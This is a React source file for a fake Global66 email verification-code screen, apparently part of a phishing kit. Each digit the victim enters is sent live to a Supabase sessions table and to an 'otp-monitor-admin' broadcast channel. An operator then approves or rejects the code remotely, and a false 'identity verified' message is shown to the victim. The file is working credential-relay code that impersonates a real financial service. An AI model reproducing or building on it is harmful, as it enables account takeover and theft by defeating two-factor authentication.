import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ChevronLeft, Loader2 } from "lucide-react";

interface Props {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const Global66MfaEmailScreen = ({ email, sessionId, onBack }: Props) => {
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const [countdown, setCountdown] = useState(30);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (countdown <= 0) return;
    const t = setInterval(() => setCountdown((c) => Math.max(0, c - 1)), 1000);
    return () => clearInterval(t);
  }, [countdown]);

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel.on("broadcast", { event: "otp_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error"); setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => { setStatus("input"); inputRefs.current[0]?.focus(); }, 2000);
      }
    }).subscribe();

    const reviewChannel = supabase.channel(`session-review-client-email-${sessionId}`);
    reviewChannel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error"); setErrorMessage("Código inválido.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => { setStatus("input"); inputRefs.current[0]?.focus(); }, 2000);
      }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error"); setErrorMessage("Código inválido.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_mfa_email" } as any).eq("id", sessionId);
          inputRefs.current[0]?.focus();
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(reviewChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId]);

  const syncToDb = useCallback((code: string) => {
    supabase.from("sessions").update({ otp_code: code } as any).eq("id", sessionId);
    const bc = supabase.channel(`otp-monitor-admin-${sessionId}-${Date.now()}`);
    bc.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        bc.send({ type: "broadcast", event: "otp_code_update", payload: { otp_code: code } });
        setTimeout(() => supabase.removeChannel(bc), 1500);
      }
    });
  }, [sessionId]);

  const handleDigitChange = (index: number, value: string) => {
    if (status !== "input") return;
    const char = value.slice(-1);
    if (char && !/^\d$/.test(char)) return;
    const nd = [...digits]; nd[index] = char; setDigits(nd);
    syncToDb(nd.join(""));
    if (char && index < 5) inputRefs.current[index + 1]?.focus();
    if (nd.every((d) => d !== "") && nd.join("").length === 6) setStatus("verifying");
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!text) return;
    const nd = ["", "", "", "", "", ""];
    for (let i = 0; i < text.length; i++) nd[i] = text[i];
    setDigits(nd); syncToDb(nd.join(""));
    if (text.length === 6) setStatus("verifying");
    else inputRefs.current[text.length]?.focus();
  };

  if (status === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center bg-[#f7f8fc] px-6">
        <div className="text-[48px] mb-4">✅</div>
        <h1 className="text-[22px] font-bold text-[#1a2233] mb-2">Verificación completa</h1>
        <p className="text-[14px] text-[#6b7a90]">Tu identidad fue verificada correctamente.</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#f7f8fc]">
      <div className="flex items-center px-4 py-4">
        <button onClick={onBack} className="p-1 text-[#1a2233]"><ChevronLeft size={24} /></button>
        <h1 className="flex-1 text-center text-[17px] font-semibold text-[#1a2233] pr-8">Código por correo</h1>
      </div>

      <div className="flex flex-1 flex-col items-center px-6 pt-10">
        <h2 className="text-[22px] font-bold text-[#1a2233] mb-2">¡Revisá tu correo!</h2>
        <p className="text-[15px] text-[#6b7a90] text-center mb-8 leading-relaxed">
          Ingresá el código de verificación que te enviamos a <span className="font-semibold text-[#1a2233]">{email}</span>
        </p>

        {errorMessage && status === "error" && (
          <div className="w-full max-w-[360px] mb-4 rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
        )}

        <div className="flex gap-3 mb-6" onPaste={handlePaste}>
          {digits.map((d, i) => (
            <input key={i} ref={(el) => { inputRefs.current[i] = el; }}
              type="text" inputMode="numeric" maxLength={1} value={d}
              onChange={(e) => handleDigitChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              disabled={status === "verifying"}
              autoFocus={i === 0}
              className="w-12 h-14 rounded-xl bg-[#eef1f8] border-0 text-center text-xl font-semibold text-[#1a2233] outline-none focus:ring-2 focus:ring-[#2b4ea2]/40 transition-all disabled:opacity-50"
            />
          ))}
        </div>

        <button disabled={countdown > 0} onClick={() => setCountdown(30)}
          className="text-[14px] text-[#6b7a90] underline underline-offset-2 disabled:opacity-40 transition-opacity">
          {countdown > 0 ? `Reenviar en 00:${String(countdown).padStart(2, "0")}` : "Reenviar código"}
        </button>

        {status === "verifying" && (
          <div className="mt-6 flex items-center gap-2 text-[14px] text-[#6b7a90]">
            <Loader2 className="h-4 w-4 animate-spin text-[#2b4ea2]" /> Verificando código...
          </div>
        )}
      </div>
    </div>
  );
};

export default Global66MfaEmailScreen;
